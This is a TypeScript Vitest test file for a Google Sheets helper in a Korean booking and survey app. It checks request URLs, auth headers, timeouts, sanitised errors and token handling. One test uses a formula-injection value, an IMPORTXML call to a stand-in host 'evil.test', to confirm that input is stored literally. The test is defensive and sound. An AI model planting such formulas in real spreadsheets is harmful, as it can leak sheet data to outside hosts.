import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { appendRow, surveySubmitted } from '../lib/sheets'

beforeEach(() => vi.stubEnv('GOOGLE_SHEET_ID', 'sheet123'))
afterEach(() => vi.unstubAllEnvs())

/** 가짜 fetch. 받은 요청이 calls 에 쌓이고, 응답은 순서대로 꺼내 쓰며 없으면 200. */
function setup(responses: (Response | Error)[] = []) {
  const calls: { url: string; init: RequestInit }[] = []
  const queue = [...responses]
  const fetch = (async (url: string | URL | Request, init?: RequestInit) => {
    calls.push({ url: String(url), init: init ?? {} })
    const next = queue.shift() ?? new Response('{}')
    if (next instanceof Error) throw next
    return next
  }) as typeof globalThis.fetch
  return { calls, fetch }
}

const token = async () => 'tok'

async function thrown(p: Promise<unknown>): Promise<Error> {
  try {
    await p
  } catch (e) {
    return e as Error
  }
  throw new Error('던지지 않았다')
}

describe('시트 추가', () => {
  it.each(['예약신청', '검사지'] as const)('한글 탭 이름을 따옴표로 감싸 인코딩한 URL 로 append 한다 (%s)', async (tab) => {
    const { calls, fetch } = setup()
    await appendRow(tab, ['가'], { fetch, token })
    expect(calls).toHaveLength(1)
    const range = encodeURIComponent(`'${tab}'!A1`)
    expect(calls[0].url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/sheet123/values/${range}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
    )
    expect(calls[0].init.method).toBe('POST')
    const headers = new Headers(calls[0].init.headers)
    expect(headers.get('authorization')).toBe('Bearer tok')
    expect(headers.get('content-type')).toBe('application/json')
  })

  it('본문은 values 에 행 하나다', async () => {
    const { calls, fetch } = setup()
    const row = ['2026-10-23 10:00:00', 'abcDEF1234', '홍길동', '', '가, 나']
    await appendRow('예약신청', row, { fetch, token })
    expect(JSON.parse(String(calls[0].init.body))).toEqual({ values: [row] })
  })

  it('수식처럼 보이는 답도 RAW 로 보내 글자 그대로 저장된다', async () => {
    const { calls, fetch } = setup()
    const row = ['=IMPORTXML("http://evil.test","//a")', '+1', '@SUM(1)']
    await appendRow('예약신청', row, { fetch, token })
    expect(new URL(calls[0].url).searchParams.get('valueInputOption')).toBe('RAW')
    expect(JSON.parse(String(calls[0].init.body)).values[0]).toEqual(row)
  })

  it('요청마다 타임아웃 신호를 건다', async () => {
    const { calls, fetch } = setup()
    await appendRow('검사지', ['가'], { fetch, token })
    expect(calls[0].init.signal).toBeInstanceOf(AbortSignal)
  })

  it.each([401, 403, 500])('2xx 가 아니면 던진다 (응답 %i, 응답 본문은 담지 않는다)', async (status) => {
    const { fetch } = setup([new Response('{"error":"SECRETDETAIL"}', { status })])
    const err = await thrown(appendRow('예약신청', ['가'], { fetch, token }))
    expect(err.message).toBe('sheets')
    expect(err.cause).toBeUndefined()
    expect(String(err)).not.toContain('SECRET')
  })

  it('fetch 가 거부되면 원래 오류를 버리고 sheets 오류로 바꾼다', async () => {
    const { fetch } = setup([new Error('connect ECONNREFUSED https://sheets.googleapis.com/ SECRETDETAIL')])
    const err = await thrown(appendRow('예약신청', ['가'], { fetch, token }))
    expect(err.message).toBe('sheets')
    expect(err.cause).toBeUndefined()
    expect(String(err)).not.toContain('SECRET')
  })

  it('시트 ID 설정이 없으면 요청을 보내지 않고 sheets 오류로 던진다', async () => {
    vi.stubEnv('GOOGLE_SHEET_ID', '')
    const { calls, fetch } = setup()
    const err = await thrown(appendRow('예약신청', ['가'], { fetch, token }))
    expect(err.message).toBe('sheets')
    expect(calls).toHaveLength(0)
  })

  it('토큰을 못 얻으면 요청을 보내지 않고 sheets 오류로 던진다', async () => {
    const { calls, fetch } = setup()
    const failing = async (): Promise<string> => {
      throw new Error('invalid_grant SECRETKEY')
    }
    const err = await thrown(appendRow('예약신청', ['가'], { fetch, token: failing }))
    expect(err.message).toBe('sheets')
    expect(err.cause).toBeUndefined()
    expect(calls).toHaveLength(0)
  })

  it('SHEETS_BASE_URL 이 있으면 구글 대신 그 주소의 같은 경로로 append 한다 (테스트용)', async () => {
    vi.stubEnv('SHEETS_BASE_URL', 'http://127.0.0.1:3031')
    const { calls, fetch } = setup()
    await appendRow('예약신청', ['가'], { fetch, token })
    const range = encodeURIComponent("'예약신청'!A1")
    expect(calls[0].url).toBe(
      `http://127.0.0.1:3031/v4/spreadsheets/sheet123/values/${range}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
    )
  })

  it('토큰 함수를 주면 SHEETS_FAKE_TOKEN 이 있어도 주어진 것을 쓴다', async () => {
    vi.stubEnv('SHEETS_FAKE_TOKEN', 'e2e-token')
    const { calls, fetch } = setup()
    await appendRow('예약신청', ['가'], { fetch, token })
    expect(new Headers(calls[0].init.headers).get('authorization')).toBe('Bearer tok')
  })
})

describe('검사지를 냈나', () => {
  const ID = 'Ab3dE5gH7j'
  const column = (...ids: string[]) => new Response(JSON.stringify({ range: "'검사지'!B1:B9", values: ids.map((v) => [v]) }))

  it('검사지 탭의 B열(신청 ID)을 GET 으로 읽는다', async () => {
    const { calls, fetch } = setup([column()])
    await surveySubmitted(ID, { fetch, token })
    expect(calls).toHaveLength(1)
    const range = encodeURIComponent("'검사지'!B:B")
    expect(calls[0].url).toBe(`https://sheets.googleapis.com/v4/spreadsheets/sheet123/values/${range}`)
    expect(calls[0].init.method ?? 'GET').toBe('GET')
    expect(new Headers(calls[0].init.headers).get('authorization')).toBe('Bearer tok')
    expect(calls[0].init.signal).toBeInstanceOf(AbortSignal)
  })

  it('B열에 그 신청 ID 가 있으면 true', async () => {
    const { fetch } = setup([column('신청 ID', 'Zz9Yy8Xx7W', ID)])
    expect(await surveySubmitted(ID, { fetch, token })).toBe(true)
  })

  it('없으면 false', async () => {
    const { fetch } = setup([column('신청 ID', 'Zz9Yy8Xx7W')])
    expect(await surveySubmitted(ID, { fetch, token })).toBe(false)
  })

  it('빈 탭이라 values 가 없으면 false', async () => {
    const { fetch } = setup([new Response(JSON.stringify({ range: "'검사지'!B1:B1000" }))])
    expect(await surveySubmitted(ID, { fetch, token })).toBe(false)
  })

  it('SHEETS_BASE_URL 이 있으면 그 주소의 같은 경로를 읽는다 (테스트용)', async () => {
    vi.stubEnv('SHEETS_BASE_URL', 'http://127.0.0.1:3031')
    const { calls, fetch } = setup([column()])
    await surveySubmitted(ID, { fetch, token })
    expect(calls[0].url).toBe(`http://127.0.0.1:3031/v4/spreadsheets/sheet123/values/${encodeURIComponent("'검사지'!B:B")}`)
  })

  it.each([
    ['2xx 가 아닌 응답', () => [new Response('{"error":"SECRETDETAIL"}', { status: 403 })]],
    ['fetch 거부', () => [new Error('ECONNREFUSED SECRETDETAIL')]],
    ['JSON 이 아닌 응답', () => [new Response('SECRETDETAIL<html>')]],
  ])('%s 이면 sheets 오류 하나로 던진다', async (_label, responses) => {
    const { fetch } = setup(responses())
    const err = await thrown(surveySubmitted(ID, { fetch, token }))
    expect(err.message).toBe('sheets')
    expect(err.cause).toBeUndefined()
    expect(String(err)).not.toContain('SECRET')
  })

  it('토큰을 못 얻으면 요청을 보내지 않고 sheets 오류로 던진다', async () => {
    const { calls, fetch } = setup()
    const failing = async (): Promise<string> => {
      throw new Error('invalid_grant SECRETKEY')
    }
    const err = await thrown(surveySubmitted(ID, { fetch, token: failing }))
    expect(err.message).toBe('sheets')
    expect(calls).toHaveLength(0)
  })
})

describe('시트 추가: 실제 토큰', () => {
  afterEach(() => {
    vi.doUnmock('google-auth-library')
    vi.resetModules()
  })

  /** google-auth-library 를 가짜로 바꾸고 lib/sheets 를 새로 읽는다. 모듈 안 JWT 보관이 비어 있는 채로 시작한다. */
  async function freshSheets(getAccessToken: () => Promise<{ token?: string | null }>) {
    const made: unknown[] = []
    vi.doMock('google-auth-library', () => ({
      JWT: class {
        constructor(options: unknown) {
          made.push(options)
        }
        getAccessToken = getAccessToken
      },
    }))
    vi.resetModules()
    const account = { client_email: 'sa@example.iam', private_key: 'FAKE-KEY' }
    vi.stubEnv('GOOGLE_SERVICE_ACCOUNT_JSON', Buffer.from(JSON.stringify(account)).toString('base64'))
    const mod = await import('../lib/sheets')
    return { made, appendRow: mod.appendRow }
  }

  it('토큰을 주지 않으면 서비스 계정으로 JWT 를 한 번만 만들어 두고 쓴다', async () => {
    const getAccessToken = vi.fn(async () => ({ token: 'jwt-tok' }))
    const { made, appendRow: fresh } = await freshSheets(getAccessToken)
    // 모듈을 읽는 것만으로는 만들지 않는다: 빌드 때는 서비스 계정 설정이 없다.
    expect(made).toEqual([])
    const { calls, fetch } = setup()
    await fresh('예약신청', ['가'], { fetch })
    await fresh('검사지', ['나'], { fetch })
    expect(made).toEqual([
      {
        email: 'sa@example.iam',
        key: 'FAKE-KEY',
        scopes: ['https://www.googleapis.com/auth/spreadsheets'],
        transporterOptions: { timeout: 5_000, retryConfig: { noResponseRetries: 0 } },
      },
    ])
    expect(getAccessToken).toHaveBeenCalledTimes(2)
    expect(calls).toHaveLength(2)
    for (const c of calls) expect(new Headers(c.init.headers).get('authorization')).toBe('Bearer jwt-tok')
  })

  it('토큰이 비어 오면 요청을 보내지 않고 sheets 오류로 던진다', async () => {
    const { appendRow: fresh } = await freshSheets(async () => ({ token: null }))
    const { calls, fetch } = setup()
    const err = await thrown(fresh('예약신청', ['가'], { fetch }))
    expect(err.message).toBe('sheets')
    expect(calls).toHaveLength(0)
  })

  describe('테스트용 변수', () => {
    it('SHEETS_FAKE_TOKEN 이 있으면 서비스 계정 없이 JWT 를 만들지 않고 그 값을 Bearer 로 쓴다', async () => {
      const getAccessToken = vi.fn(async () => ({ token: 'jwt-tok' }))
      const { made, appendRow: fresh } = await freshSheets(getAccessToken)
      vi.stubEnv('GOOGLE_SERVICE_ACCOUNT_JSON', '')
      vi.stubEnv('SHEETS_FAKE_TOKEN', 'e2e-token')
      const { calls, fetch } = setup()
      await fresh('예약신청', ['가'], { fetch })
      expect(made).toEqual([])
      expect(getAccessToken).not.toHaveBeenCalled()
      expect(new Headers(calls[0].init.headers).get('authorization')).toBe('Bearer e2e-token')
    })

    it('운영(NODE_ENV=production)이면 SHEETS_BASE_URL·SHEETS_FAKE_TOKEN 을 무시하고 구글 주소와 서비스 계정 토큰을 쓴다', async () => {
      const { appendRow: fresh } = await freshSheets(async () => ({ token: 'jwt-tok' }))
      vi.stubEnv('NODE_ENV', 'production')
      vi.stubEnv('SHEETS_BASE_URL', 'http://127.0.0.1:3031')
      vi.stubEnv('SHEETS_FAKE_TOKEN', 'e2e-token')
      const { calls, fetch } = setup()
      await fresh('예약신청', ['가'], { fetch })
      expect(calls[0].url.startsWith('https://sheets.googleapis.com/v4/spreadsheets/sheet123/values/')).toBe(true)
      expect(new Headers(calls[0].init.headers).get('authorization')).toBe('Bearer jwt-tok')
    })
  })
})
